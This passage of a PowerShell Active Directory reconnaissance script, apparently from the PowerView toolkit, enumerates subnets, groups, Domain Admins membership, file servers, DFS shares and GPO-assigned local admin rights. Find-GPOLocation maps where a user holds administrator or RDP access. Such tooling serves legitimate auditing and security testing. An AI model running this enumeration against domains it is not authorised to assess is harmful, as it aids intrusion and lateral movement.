            $SiteSearcher.filter="(&(objectCategory=site)(name=$SiteName)(gplink=*$GUID*))"
        }
        else {
            $SiteSearcher.filter="(&(objectCategory=site)(name=$SiteName))"
        }
        
        # eliminate that pesky 1000 system limit
        $SiteSearcher.PageSize = 200

        $SiteSearcher.FindAll() | ForEach-Object {
            if ($FullData) {
                # if we're returning full data objects
                $properties = $_.Properties
                $out = New-Object psobject

                $properties.PropertyNames | % {
                    if($_ -eq "objectguid"){
                        # convert the GUID to a string
                        $out | Add-Member Noteproperty $_ (New-Object Guid (,$properties[$_][0])).Guid
                    }
                    elseif ($properties[$_].count -eq 1) {
                        $out | Add-Member Noteproperty $_ $properties[$_][0]
                    }
                    else {
                        $out | Add-Member Noteproperty $_ $properties[$_]
                    }
                }
                $out
            }
            else {
                # otherwise just return the site name
                $_.properties.name
            }
        }
    }
}


function Get-NetSubnet {
    <#
        .SYNOPSIS
        Gets a list of all current subnets in a domain.

        .PARAMETER SiteName
        Only return subnets from the specified SiteName.

        .PARAMETER Domain
        The domain to query for subnets, defaults to current.

        .PARAMETER DomainController
        Domain controller to reflect queries through.

        .PARAMETER ADSpath
        The LDAP source to search through.

        .PARAMETER FullData
        Return full subnet objects instead of just object names (the default).

        .EXAMPLE
        > Get-NetSubnet
        Returns all subnet names in the current domain.

        .EXAMPLE
        > Get-NetSubnet -Domain testlab.local -FullData
        Returns the full data objects for all subnets in testlab.local
    #>
    [CmdletBinding()]
    Param (
        [String]
        $SiteName,

        [String]
        $Domain,

        [String]
        $ADSpath,

        [String]
        $DomainController,

        [Switch]
        $FullData
    )

    $SiteSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -ADSprefix "CN=Subnets,CN=Sites,CN=Configuration"

    if($SiteSearcher) {

        $SiteSearcher.filter="(&(objectCategory=subnet))"
        # eliminate that pesky 1000 system limit

        $SiteSearcher.PageSize = 200

        $SiteSearcher.FindAll() | ForEach-Object {
            if ($FullData) {
                # if we're returning full data objects
                $properties = $_.Properties
                $out = New-Object psobject

                $properties.PropertyNames | % {
                    if($_ -eq "objectguid"){
                        # convert the GUID to a string
                        $out | Add-Member Noteproperty $_ (New-Object Guid (,$properties[$_][0])).Guid
                    }
                    elseif ($properties[$_].count -eq 1) {
                        $out | Add-Member Noteproperty $_ $properties[$_][0]
                    }
                    else {
                        $out | Add-Member Noteproperty $_ $properties[$_]
                    }
                }
                if($SiteName) {
                    $out | ? { $properties.siteobject -match "CN=$SiteName," }
                }
                else {
                    $out
                }
            }
            else {
                # otherwise just return the subnet name and site name
                if ( ($SiteName -and ($_.properties.siteobject -match "CN=$SiteName,")) -or !$SiteName) {
                    $out = New-Object psobject
                    $out | Add-Member Noteproperty 'Subnet' $_.properties.name[0]
                    try {
                        $out | Add-Member Noteproperty 'Site' ($_.properties.siteobject[0]).split(",")[0]
                    }
                    catch {
                        $out | Add-Member Noteproperty 'Site' 'Error' 
                    }
                    $out                    
                }
            }
        }
    }
}


function Get-DomainSID {
    <#
        .SYNOPSIS
        Gets the SID for the domain.

        .PARAMETER Domain
        The domain to query.

        .EXAMPLE
        > Get-DomainSID -Domain TEST
        Returns SID for the domain 'TEST'
    #>

    param(
        [string]
        $Domain
    )

    # query for the primary domain controller so we can extract the domain SID for filtering
    $PrimaryDC = (Get-NetDomain -Domain $Domain).PdcRoleOwner
    $PrimaryDCSID = (Get-NetComputer -Domain $Domain -Hostname $PrimaryDC -FullData).objectsid
    $parts = $PrimaryDCSID.split("-")
    $parts[0..($parts.length -2)] -join "-"
}


function Get-NetGroup {
    <#
        .SYNOPSIS
        Gets a list of all current groups in a domain, or all
        the groups a given user/group object belongs to.

        .PARAMETER GroupName
        The group name to query for, wildcards accepted.

        .PARAMETER SID
        The group SID to query for.

        .PARAMETER UserName
        The user name (or group name) to query for all effective
        groups of.

        .PARAMETER Filter
        A customized ldap filter string to use, e.g. "(description=*admin*)"

        .PARAMETER Domain
        The domain to query for groups.

        .PARAMETER DomainController
        Domain controller to reflect queries through.

        .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

        .PARAMETER AdminCount
        Switch. Return users with adminCount=1.

        .PARAMETER FullData
        Return full group objects instead of just object names (the default).

        .EXAMPLE
        > Get-NetGroup
        Returns the current groups in the domain.

        .EXAMPLE
        > Get-NetGroup -GroupName *admin*
        Returns all groups with "admin" in their group name.

        .EXAMPLE
        > Get-NetGroup -Domain testing -FullData
        Returns full group data objects in the 'testing' domain
    #>

    [CmdletBinding()]
    param(
        [String]
        $GroupName = '*',

        [String]
        $SID,

        [String]
        $UserName,

        [String]
        $Filter,

        [String]
        $Domain,
        
        [String]
        $DomainController,
        
        [String]
        $ADSpath,

        [Switch]
        $AdminCount,

        [Switch]
        $FullData
    )

    $GroupSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath

    if($GroupSearcher) {

        if($AdminCount) {
            Write-Verbose "Checking for adminCount=1"
            $Filter += "(admincount=1)"
        }

        if ($UserName) {
            # get the user objects so we can determine its distinguished name for the ldap query
            $UserDN = (Get-NetUser -UserName $UserName -Domain $Domain -ADSpath $ADSpath).distinguishedname
            # recurse "up" the nested group structure and get all groups 
            #   this user/group object is effectively a member of
            $GroupSearcher.filter = "(&(objectClass=group)(member:1.2.840.113556.1.4.1941:=$UserDN)$filter)"
        }
        else {
            if(!$GroupName -or ($GroupName -eq '')) {
                $GroupName = '*'
            }

            if ($SID) {
                $GroupSearcher.filter = "(&(objectClass=group)(objectSID=$SID)$filter)"
            }
            else {
                $GroupSearcher.filter = "(&(objectClass=group)(name=$GroupName)$filter)"
            }
        }
        # eliminate that pesky 1000 system limit
        $GroupSearcher.PageSize = 200

        $GroupSearcher.FindAll() | ForEach-Object {
            # if we're returning full data objects
            if ($FullData){
                $properties = $_.Properties
                $out = New-Object psobject

                $properties.PropertyNames | % {
                    if ($_ -eq "objectsid"){
                        # convert the SID to a string
                        $out | Add-Member Noteproperty $_ ((New-Object System.Security.Principal.SecurityIdentifier($properties[$_][0],0)).Value)
                    }
                    elseif($_ -eq "objectguid"){
                        # convert the GUID to a string
                        $out | Add-Member Noteproperty $_ (New-Object Guid (,$properties[$_][0])).Guid
                    }
                    else {
                        if ($properties[$_].count -eq 1) {
                            $out | Add-Member Noteproperty $_ $properties[$_][0]
                        }
                        else {
                            $out | Add-Member Noteproperty $_ $properties[$_]
                        }
                    }
                }
                $out
            }
            else{
                # otherwise we're just returning the group name
                $_.properties.samaccountname
            }
        }
    }
}


function Get-NetGroupMember {
    <#
        .SYNOPSIS
        Gets a list of all current users in a specified domain group.

        .DESCRIPTION
        This function users [ADSI] and LDAP to query the current AD context
        or trusted domain for users in a specified group. If no GroupName is
        specified, it defaults to querying the "Domain Admins" group.
        This is a replacement for "net group 'name' /domain"

        .PARAMETER SID
        The Group SID to query for users. If not given, it defaults to 512 "Domain Admins"

        .PARAMETER GroupName
        The group name to query for users.

        .PARAMETER Filter
        A customized ldap filter string to use, e.g. "(description=*admin*)"

        .PARAMETER Domain
        The domain to query for group users.

        .PARAMETER DomainController
        Domain controller to reflect queries through.

        .PARAMETER FullData
        Switch. Returns full data objects instead of just group/users.

        .PARAMETER Recurse
        Switch. If the group member is a group, recursively try to query its members as well.

        .EXAMPLE
        > Get-NetGroupMember
        Returns the usernames that of members of the "Domain Admins" domain group.

        .EXAMPLE
        > Get-NetGroupMember -Domain testing -GroupName "Power Users"
        Returns the usernames that of members of the "Power Users" group
        in the 'testing' domain.

        .LINK
        http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-an-active-directory-group-recursively/
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$true)]
        [String]
        $GroupName,

        [String]
        $SID,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $FullData,

        [Switch]
        $Recurse
    )

    begin {
        # so this isn't repeated if users are passed on the pipeline
        $GroupSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController

        # get the current domain if none was specified
        if(!$Domain) {
            $Domain = (Get-NetDomain).Name
        }
    }

    process {

        if ($GroupSearcher) {

            $GroupSearcher.PageSize = 200

            if ($Recurse) {
                # resolve the group to a distinguishedname
                if ($GroupName) {
                    $Group = Get-NetGroup -GroupName $GroupName -Domain $Domain -FullData
                }
                elseif ($SID) {
                    $Group = Get-NetGroup -SID $SID -Domain $Domain -FullData
                }
                else {
                    $SID = (Get-DomainSID -Domain $Domain) + "-512"
                    $Group = Get-NetGroup -SID $SID -Domain $Domain -FullData
                }
                $GroupDN = $Group.distinguishedname
                $GroupFoundName = $Group.name

                if ($GroupDN) {
                    $GroupSearcher.filter = "(&(objectClass=user)(memberof:1.2.840.113556.1.4.1941:=$GroupDN)$filter)"
                    $GroupSearcher.PropertiesToLoad.AddRange(('distinguishedName','samaccounttype','lastlogon','lastlogontimestamp','dscorepropagationdata','objectsid','whencreated','badpasswordtime','accountexpires','iscriticalsystemobject','name','usnchanged','objectcategory','description','codepage','instancetype','countrycode','distinguishedname','cn','admincount','logonhours','objectclass','logoncount','usncreated','useraccountcontrol','objectguid','primarygroupid','lastlogoff','samaccountname','badpwdcount','whenchanged','memberof','pwdlastset','adspath'))

                    $members = $GroupSearcher.FindAll()
                    $GroupFoundName = $GroupName
                }
                else {
                    Write-Error "Unable to find Group"
                }
            }
            else {
                if ($GroupName) {
                    $GroupSearcher.filter = "(&(objectClass=group)(name=$GroupName)$filter)"
                }
                elseif ($SID) {
                    $GroupSearcher.filter = "(&(objectClass=group)(objectSID=$SID)$filter)"
                }
                else {
                    $SID = (Get-DomainSID -Domain $Domain) + "-512"
                    $GroupSearcher.filter = "(&(objectClass=group)(objectSID=$SID)$filter)"
                }

                $GroupSearcher.FindAll() | % {
                    try {
                        if (!($_) -or !($_.properties) -or !($_.properties.name)) { continue }

                        $GroupFoundName = $_.properties.name[0]
                        $members = @()

                        if ($_.properties.member.Count -eq 0) {
                            $finished = $false
                            $bottom = 0
                            $top = 0
                            while(!$finished) {
                                $top = $bottom + 1499
                                $memberRange="member;range=$bottom-$top"
                                $bottom += 1500
                                $GroupSearcher.PropertiesToLoad.Clear()
                                [void]$GroupSearcher.PropertiesToLoad.Add("$memberRange")
                                try {
                                    $result = $GroupSearcher.FindOne()
                                    if ($result) {
                                        $rangedProperty = $_.Properties.PropertyNames -like "member;range=*"
                                        $results = $_.Properties.item($rangedProperty)
                                        if ($results.count -eq 0) {
                                            $finished = $true
                                        }
                                        else {
                                            $results | % {
                                                $members += $_
                                            }
                                        }
                                    }
                                    else {
                                        $finished = $true
                                    }
                                } 
                                catch [System.Management.Automation.MethodInvocationException] {
                                    $finished = $true
                                }
                            }
                        } 
                        else {
                            $members = $_.properties.member
                        }
                    } 
                    catch {
                        write-verbose $_
                    }
                }
            }

            $members | ? {$_} | ForEach-Object {
                # for each user/member, do a quick adsi object grab
                if ($Recurse) {
                    $properties = $_.Properties
                } 
                else {
                    if ($DomainController){
                        $properties = ([adsi]"LDAP://$DomainController/$_").Properties
                    }
                    else {
                        $properties = ([adsi]"LDAP://$_").Properties
                    }
                }

                if($properties.samaccounttype -match '268435456'){
                    $isGroup = $True
                }
                else {
                    $isGroup = $False
                }

                $out = New-Object psobject
                $out | Add-Member Noteproperty 'GroupDomain' $Domain
                $out | Add-Member Noteproperty 'GroupName' $GroupFoundName

                if ($FullData){
                    $properties.PropertyNames | % {
                        # TODO: errors on cross-domain users?
                        if ($_ -eq "objectsid"){
                            # convert the SID to a string
                            $out | Add-Member Noteproperty $_ ((New-Object System.Security.Principal.SecurityIdentifier($properties[$_][0],0)).Value)
                        }
                        elseif($_ -eq "objectguid"){
                            # convert the GUID to a string
                            $out | Add-Member Noteproperty $_ (New-Object Guid (,$properties[$_][0])).Guid
                        }
                        else {
                            if ($properties[$_].count -eq 1) {
                                $out | Add-Member Noteproperty $_ $properties[$_][0]
                            }
                            else {
                                $out | Add-Member Noteproperty $_ $properties[$_]
                            }
                        }
                    }
                }
                else {
                    $MemberDN = $properties.distinguishedname[0]
                    # extract the FQDN from the Distinguished Name
                    $MemberDomain = $MemberDN.subString($MemberDN.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'
                    if ($properties.samaccountname) {
                        # forest users have the samAccountName set
                        $MemberName = $properties.samaccountname[0]
                    } 
                    else {
                        # external trust users have a SID, so convert it
                        try {
                            $MemberName = Convert-SidToName $properties.cn[0]
                        }
                        catch {
                            # if there's a problem contacting the domain to resolve the SID
                            $MemberName = $properties.cn
                        }
                    }
                    $out | Add-Member Noteproperty 'MemberDomain' $MemberDomain
                    $out | Add-Member Noteproperty 'MemberName' $MemberName
                    $out | Add-Member Noteproperty 'IsGroup' $IsGroup
                    $out | Add-Member Noteproperty 'MemberDN' $MemberDN
                }
                $out
            }
        }
    }
}


function Get-NetFileServer {
    <#
        .SYNOPSIS
        Returns a list of all file servers extracted from user 
        homedirectory, scriptpath, and profilepath fields.

        .PARAMETER Domain
        The domain to query for user file servers.

        .PARAMETER DomainController
        Domain controller to reflect queries through.

        .PARAMETER TargetUsers
        An array of users to query for file servers.

        .EXAMPLE
        > Get-NetFileServer
        Returns active file servers.

        .EXAMPLE
        > Get-NetFileServer -Domain testing
        Returns active file servers for the 'testing' domain.
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false,HelpMessage="The target domain.")]
        [String]
        $Domain,

        [Parameter(Mandatory=$false,HelpMessage="Domain controller to reflect queries through.")]
        [String]
        $DomainController,

        [Parameter(Mandatory=$false,HelpMessage="Array of users to find File Servers.")]
        [string[]]
        $TargetUsers
    )

    function SplitPath {
        param([String]$Path)

        $ret = $null

        if ($Path -and ($Path.split("\\").Count -ge 3)) {
            $temp = $Path.split("\\")[2]
            if($temp -and ($temp -ne '')) {
                $ret = $temp
            }
        }

        $ret
    }

    Get-NetUser -Domain $Domain -DomainController $DomainController | ? {$_} | ? {
        # filter for any target users
        if($TargetUsers) {
            $TargetUsers -Match $_.samAccountName
        }
        else { $True } } | % {
        if($_.homedirectory) {
            SplitPath($_.homedirectory)
        }
        if($_.scriptpath) {
            SplitPath($_.scriptpath)
        }
        if($_.profilepath) {
            SplitPath($_.profilepath)
        }
    } | ?{$_} | Sort-Object -Unique
}


function Get-DFSshare {
    <#
        .SYNOPSIS
        Returns a list of all fault-tolerant distributed file
        systems for a given domain.

        .PARAMETER Version
        The version of DFS to query for servers.
        1/v1, 2/v2, or all

        .PARAMETER Domain
        The domain to query for user DFS shares.

        .PARAMETER DomainController
        Domain controller to reflect queries through.

        .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

        .EXAMPLE
        > Get-DFSshare
        Returns all distributed file system shares for the current domain.

        .EXAMPLE
        > Get-DFSshare -Domain test
        Returns all distributed file system shares for the 'test' domain.
    #>

    [CmdletBinding()]
    param(
        [string]
        [ValidateSet("All","V1","1","V2","2")]
        $Version = "All",

        [string]
        $Domain,

        [String]
        $DomainController,

        [string]
        $ADSpath
    )

    function Get-DFSshareV1 {
        [CmdletBinding()]
        param(
            [String]
            $Domain,

            [String]
            $DomainController,

            [String]
            $ADSpath
        )

        $DFSsearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath

        if($DFSsearcher) {
            $DFSshares = @()
            $DFSsearcher.filter = "(&(objectClass=fTDfs))"
            $DFSsearcher.PageSize = 200

            $DFSSearcher.FindAll() | ? {$_} | ForEach-Object {
                $properties = $_.Properties
                $remoteNames = $properties.remoteservername

                $DFSshares += $remoteNames | ForEach-Object {
                    try {
                        if ( $_.Contains('\') ) {
                            $out = new-object psobject
                            $out | Add-Member Noteproperty 'Name' $properties.name[0]
                            $out | Add-Member Noteproperty 'RemoteServerName' $_.split("\")[2]
                            $out
                        }
                    }
                    catch {}
                }
            }
            $DFSshares | Sort-Object -Property "RemoteServerName"
        }
    }

    function Get-DFSshareV2 {
        [CmdletBinding()]
        param(
            [string]
            $Domain,

            [String]
            $DomainController,

            [string]
            $ADSpath
        )

        $DFSsearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath

        if($DFSsearcher) {
            $DFSshares = @()
            $DFSsearcher.filter = "(&(objectClass=msDFS-Linkv2))"
            $DFSSearcher.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))
            $DFSsearcher.PageSize = 200

            $DFSSearcher.FindAll() | ? {$_} | ForEach-Object {
                $properties = $_.Properties
                $target_list = $properties.'msdfs-targetlistv2'[0]
                $xml = [xml][System.Text.Encoding]::Unicode.GetString($target_list[2..($target_list.Length-1)])
                $DFSshares += $xml.targets.ChildNodes | ForEach-Object {
                    try {
                        $target = $_.InnerText
                        if ( $target.Contains('\') ) {
                            $dfs_root = $target.split("\")[3]
                            $share_name = $properties.'msdfs-linkpathv2'[0]
                            $out = new-object psobject
                            $out | Add-Member Noteproperty 'Name' "$dfs_root$share_name"
                            $out | Add-Member Noteproperty 'RemoteServerName' $target.split("\")[2]
                            $out
                        }
                    }
                    catch {}
                }
            }
            $DFSshares | Sort-Object -Property "RemoteServerName"
        }
    }

    $DFSshares = @()
    
    if ( ($Version -eq "all") -or ($Version.endsWith("1")) ) {
        $DFSshares += Get-DFSshareV1 -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath
    }
    if ( ($Version -eq "all") -or ($Version.endsWith("2")) ) {
        $DFSshares += Get-DFSshareV2 -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath
    }

    $DFSshares | Sort-Object -Property "RemoteServerName"
}


########################################################
#
# GPO related functions.
#
########################################################


function Get-GptTmpl {
    <#
        .SYNOPSIS
        Helper to parse a GptTmpl.inf policy file path into a custom object.

        .PARAMETER GptTmplPath
        The GptTmpl.inf file path name to parse. 

        .EXAMPLE
        > Get-GptTmpl -GptTmplPath "\\dev.testlab.local\sysvol\dev.testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

        Parse the default domain policy .inf for dev.testlab.local
    #>
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True)]
        [String]
        $GptTmplPath
    )

    $SectionName = ''
    $SectionsTemp = @{}
    $SectionsFinal = @{}

    try {

        if(Test-Path $GptTmplPath) {
            Write-Verbose "Parsing $GptTmplPath"

            Get-Content $GptTmplPath -ErrorAction Stop | Foreach-Object {
                if ($_ -match '\[') {
                    # section names
                    $SectionName = $_.trim('[]') -replace ' ',''
                }
                elseif($_ -match '='){
                    $parts = $_.split('=')
                    $PropertyName = $parts[0].trim()
                    $PropertyValues = $parts[1].trim()

                    if($PropertyValues -match ',') {
                        $PropertyValues = $PropertyValues.split(',')
                    }

                    if(!$SectionsTemp[$SectionName]) {
                        $SectionsTemp.Add($SectionName, @{})
                    }
                    # add the parsed property into the relevant Section name
                    $SectionsTemp[$SectionName].Add( $PropertyName, $PropertyValues )
                }
            }

            foreach ($Section in $SectionsTemp.keys) {
                # transform each nested hash table into a custom object
                $SectionsFinal[$Section] = New-Object psobject -Property $SectionsTemp[$Section]
            }

            # transform the parent hash table into a custom object
            New-Object psobject -Property $SectionsFinal
        }
    }
    catch {
        # Write-Warning $_
    }
}


function Get-NetGPO {
    <#
        .SYNOPSIS
        Gets a list of all current GPOs in a domain.

        .PARAMETER GPOname
        The GPO name to query for, wildcards accepted.   

        .PARAMETER DisplayName
        The GPO display name to query for, wildcards accepted.   

        .PARAMETER Domain
        The domain to query for GPOs.

        .PARAMETER DomainController
        Domain controller to reflect queries through.

        .PARAMETER ADSpath
        The LDAP source to search through
        e.g. "LDAP://cn={8FF59D28-15D7-422A-BCB7-2AE45724125A},cn=policies,cn=system,DC=dev,DC=testlab,DC=local"

        .EXAMPLE
        > Get-NetGPO
        Returns the GPOs in the current domain. 
    #>
    [CmdletBinding()]
    Param (
        [String]
        $GPOname = '*',

        [String]
        $DisplayName,

        [String]
        $Domain,

        [String]
        $DomainController,
        
        [String]
        $ADSpath
    )

    $GPOSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath

    if ($GPOSearcher) {
        if($DisplayName) {
            $GPOSearcher.filter="(&(objectCategory=groupPolicyContainer)(displayname=$DisplayName))"
        }
        else {
            $GPOSearcher.filter="(&(objectCategory=groupPolicyContainer)(name=$GPOname))"
        }
        # eliminate that pesky 1000 system limit
        $GPOSearcher.PageSize = 200

        $GPOSearcher.FindAll() | ForEach-Object {
            $properties = $_.Properties
            $out = New-Object psobject

            $properties.PropertyNames | % {
                if($_ -eq "objectguid"){
                    # convert the GUID to a string
                    $out | Add-Member Noteproperty $_ (New-Object Guid (,$properties[$_][0])).Guid
                }
                elseif ($properties[$_].count -eq 1) {
                    $out | Add-Member Noteproperty $_ $properties[$_][0]
                }
                else {
                    $out | Add-Member Noteproperty $_ $properties[$_]
                }
            }
            $out
        }
    }
}


function Get-NetGPOGroup {
    <#
        .SYNOPSIS
        Returns all GPOs in a domain that set "Restricted Groups"
        or use groups.xml on on target machines.

        .PARAMETER GPOname
        The GPO name to query for, wildcards accepted.   

        .PARAMETER DisplayName
        The GPO display name to query for, wildcards accepted.   

        .PARAMETER Domain
        The domain to query for GPOs.

        .PARAMETER DomainController
        Domain controller to reflect queries through.

        .PARAMETER ADSpath
        The LDAP source to search through
        e.g. "LDAP://cn={8FF59D28-15D7-422A-BCB7-2AE45724125A},cn=policies,cn=system,DC=dev,DC=testlab,DC=local"

        .EXAMPLE
        > Get-NetGPOGroup
        Get all GPOs that set local groups on the current domain.
    #>
    [CmdletBinding()]
    Param (
        [String]
        $GPOname = '*',

        [String]
        $DisplayName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath
    )

    # get every GPO from the specified domain with restricted groups set
    Get-NetGPO -GPOName $GPOname -DisplayName $GPOname -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath | Foreach-Object {

        $Memberof = $null
        $Members = $null
        $GPOdisplayName = $_.displayname
        $GPOname = $_.name
        $GPOPath = $_.gpcfilesyspath

        # parse the GptTmpl.inf 'Restricted Groups' file if it exists
        $INFpath = "$GPOPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
        $Inf = Get-GptTmpl $INFpath

        if($Inf.GroupMembership) {

            $Memberof = $Inf.GroupMembership | gm *Memberof | % { $Inf.GroupMembership.($_.name) } | % {$_.trim('*')}
            $Members = $Inf.GroupMembership | gm *Members | % { $Inf.GroupMembership.($_.name) } | % {$_.trim('*')}

            # only return an object if Members are found
            if ($Members -or $Memberof) {

                # if there is no Memberof defined, assume local admins
                if(!$Memberof) {
                    $Memberof = 'S-1-5-32-544'
                }
                if($Memberof -isnot [system.array]){$Memberof = @($Memberof)}

                $out = New-Object psobject
                $out | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName
                $out | Add-Member Noteproperty 'GPOName' $GPOName
                $out | Add-Member Noteproperty 'GPOPath' $INFpath
                $out | Add-Member Noteproperty 'Filters' $Null
                $out | Add-Member Noteproperty 'MemberOf' $Memberof
                $out | Add-Member Noteproperty 'Members' $Members
                $out
            }
        }

        # parse the Groups.xml file if it exists
        $GroupsXMLPath = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
        if(Test-Path $GroupsXMLPath) {

            [xml] $GroupsXMLcontent = Get-Content $GroupsXMLPath

            # process all group properties in the XML
            $GroupsXMLcontent | Select-Xml "//Group" | Select-Object -ExpandProperty node | % {


                $Members = @()
                $MemberOf = @()

                # extract the localgroup sid for memberof
                $LocalSid = $_.Properties.GroupSid
                if(!$LocalSid) {
                    if($_.Properties.groupName -match 'Administrators'){
                        $LocalSid = 'S-1-5-32-544'
                    }
                    elseif($_.Properties.groupName -match 'Remote Desktop') {
                        $LocalSid = 'S-1-5-32-555'
                    }
                    else {
                        $LocalSid = $_.Properties.groupName
                    }
                }
                $MemberOf = @($LocalSid)

                $_.Properties.members | % {
                    # process each member of the above local group
                    $_ | Select-Object -ExpandProperty Member | ? { $_.action -match 'ADD' } | %{

                        if($_.sid) {
                            $Members += $_.sid
                        }
                        else {
                            # just a straight local account name
                            $Members += $_.name
                        }
                    }
                }

                if ($Members -or $Memberof) {

                    # extract out any/all filters...I hate you GPP
                    $Filters = $_.filters | % {
                        $_ | Select-Object -ExpandProperty Filter* | % {
                            $out = New-Object psobject
                            $out | Add-Member Noteproperty 'Type' $_.LocalName
                            $out | Add-Member Noteproperty 'Value' $_.name 
                            $out
                        }
                    }

                    $out = New-Object psobject
                    $out | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName
                    $out | Add-Member Noteproperty 'GPOName' $GPOName
                    $out | Add-Member Noteproperty 'GPOPath' $GroupsXMLPath
                    $out | Add-Member Noteproperty 'Filters' $Filters
                    $out | Add-Member Noteproperty 'MemberOf' $Memberof
                    $out | Add-Member Noteproperty 'Members' $Members
                    $out

                }

            }
        }
    }
}


function Find-GPOLocation {
    <#
        .SYNOPSIS
        Takes a user/group name and optional domain, and determines 
        the computers in the domain the user/group has local admin 
        (or RDP) rights to.

        It does this by:
            1.  resolving the user/group to its proper sid
            2.  enumerating all groups the user/group is a current part of 
                and extracting all target SIDs to build a target SID list
            3.  pulling all GPOs that set 'Restricted Groups' by calling
                Get-NetGPOGroup
            4.  matching the target sid list to the queried GPO SID list
                to enumerate all GPO the user is effectively applied with
            5.  enumerating all OUs and sites and applicable GPO GUIs are
                applied to through gplink enumerating
            6.  querying for all computers under the given OUs or sites

        .PARAMETER UserName
        A (single) user name name to query for access.

        .PARAMETER GroupName
        A (single) group name name to query for access. 

        .PARAMETER Domain
        Optional domain the user exists in for querying.

        .PARAMETER DomainController
        Domain controller to reflect queries through.

        .PARAMETER LocalGroup
        The local group to check access against.
        Can be "Administrators" (S-1-5-32-544), "RDP/Remote Desktop Users" (S-1-5-32-555),
        or a custom local SID.
        Defaults to local 'Administrators'.

        .EXAMPLE
        > Find-GPOLocation -UserName dfm
        Find all computers that dfm user has local administrator rights to in 
        the current domain.

        .EXAMPLE
        > Find-GPOLocation -UserName dfm -Domain dev.testlab.local
        Find all computers that dfm user has local administrator rights to in 
        the dev.testlab.local domain.

        .EXAMPLE
        > Find-GPOLocation -UserName jason -LocalGroup RDP
        Find all computers that jason has local RDP access rights to in the domain.
    #>
    [CmdletBinding()]
    Param (
        [String]
        $UserName,

        [String]
        $GroupName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $LocalGroup = 'Administrators'
    )

    if($UserName) {

        $User = Get-NetUser -UserName $UserName -Domain $Domain -DomainController $DomainController
        $UserSid = $User.objectsid

        if(!$UserSid) {    
            Throw "User '$UserName' not found!"
        }

        $TargetSid = $UserSid
        $ObjectDistName = $User.distinguishedname
    }
    elseif($GroupName) {
        $Group = Get-NetGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -FullData
        $GroupSid = $Group.objectsid

        if(!$GroupSid) {    
            Throw "Group '$GroupName' not found!"
        }

        $TargetSid = $GroupSid
        $ObjectDistName = $Group.distinguishedname
    }
    else {
        throw "-UserName or -GroupName must be specified!"
    }

    if($LocalGroup -like "*Admin*"){
        $LocalSID = "S-1-5-32-544"
    }
    elseif ( ($LocalGroup -like "*RDP*") -or ($LocalGroup -like "*Remote*") ){
        $LocalSID = "S-1-5-32-555"
    }
    elseif ($LocalGroup -like "S-1-5*") {
        $LocalSID = $LocalGroup
    }
    else {
        throw "LocalGroup must be 'Administrators', 'RDP', or a 'S-1-5-X' type sid."
    }

    Write-Verbose "LocalSid: $LocalSID"
    Write-Verbose "TargetSid: $TargetSid"
    Write-Verbose "TargetObjectDistName: $ObjectDistName"

    if($TargetSid -isnot [system.array]){$TargetSid = @($TargetSid)}

    # recurse 'up', getting the the groups this user is an effective member of
    #   thanks @meatballs__ for the efficient example in Get-NetGroup !
    $GroupSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController
    $GroupSearcher.filter = "(&(objectClass=group)(member:1.2.840.113556.1.4.1941:=$ObjectDistName))"
    $GroupSearcher.FindAll() | % {
        $GroupSid = (New-Object System.Security.Principal.SecurityIdentifier(($_.properties.objectsid)[0],0)).Value
        $TargetSid += $GroupSid
    }

    Write-Verbose "Effective target sids: $TargetSid"

    # get all GPO groups, and filter on ones that match our target SID list
    #   and match the target local sid memberof list
    $GPOgroups = Get-NetGPOGroup -Domain $Domain -DomainController $DomainController | % {
        if ($_.members) {
            $_.members = $_.members | ?{$_} | % {
                if($_ -match "S-1-5") {
                    $_
                }
                else {
                    # if there are any plain group names, try to resolve them to sids
                    Convert-NameToSid $_ -Domain $domain
                }
            }

            # stop PowerShell 2.0's string stupid unboxing
            if($_.members -isnot [system.array]){$_.members = @($_.members)}
            if($_.memberof -isnot [system.array]){$_.memberof = @($_.memberof)}
            
            if($_.members) {
                try {
                    # only return groups that contain a target sid
                    if( (Compare-Object $_.members $TargetSid -IncludeEqual -ExcludeDifferent) ) {
                        if ($_.memberof -contains $LocalSid) {
                            $_
                        }
                    }
                } catch{}
            }
        }
    }

    Write-Verbose "GPOgroups: $GPOgroups"
    $ProcessedGUIDs = @{}

    # process the matches and build the result objects
    $GPOgroups | % {

        $GPOguid = $_.GPOName

        if( -not $ProcessedGUIDs[$GPOguid] ) {
            $GPOname = $_.GPODisplayName
            $Filters = $_.Filters

            # find any OUs that have this GUID applied
            Get-NetOU -Domain $Domain -DomainController $DomainController -GUID $GPOguid -FullData | % {
                if($Filters){
                    # filter for computer name/org unit if a filter is specified
                    #   TODO: handle other filters?
                    $OUComputers = Get-NetComputer -ADSpath $_.ADSpath -FullData | ? {
                        $_.adspath -match ($Filters.Value)
